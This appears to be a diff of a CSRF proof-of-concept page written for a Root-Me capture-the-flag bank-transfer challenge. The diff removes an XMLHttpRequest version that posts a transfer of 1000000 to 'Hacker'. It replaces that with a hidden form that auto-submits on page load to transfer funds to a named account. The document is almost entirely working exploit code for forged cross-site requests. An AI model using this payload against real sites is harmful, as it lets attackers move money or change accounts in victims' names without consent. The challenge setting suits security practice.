@@ -6,35 +6,13 @@
     <title>CSRF Attack</title>
 </head>
 <body>
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="the_real_mysk">
+        <input type="hidden" name="amount" value="10">
+        <input type="submit" value="Submit">
+    </form>
     <script>
-        function post(url, params={}){
-            var params_post = [];
-            for(const key in params){
-                params_post.push(`${key}=${params[key]}`);
-            }
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", url, true);
-            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === 4) {
-                    console.log('Response:', xhr.responseText);
-                    alert('Response: ' + xhr.responseText);
-                }
-            };
-            xhr.send(params_post.join("&"));
-        }
-
-        // URL de la requête de transfert
-        var url = "https://bankme-1.challenges.pro.root-me.org/transfer/";
-
-        // Paramètres de la requête
-        var params = {
-            recipient: "Hacker",
-            amount: "1000000"
-        };
-
-        // Envoyer la requête POST
-        post(url, params);
+        document.forms[0].submit();
     </script>
 </body>
 </html>
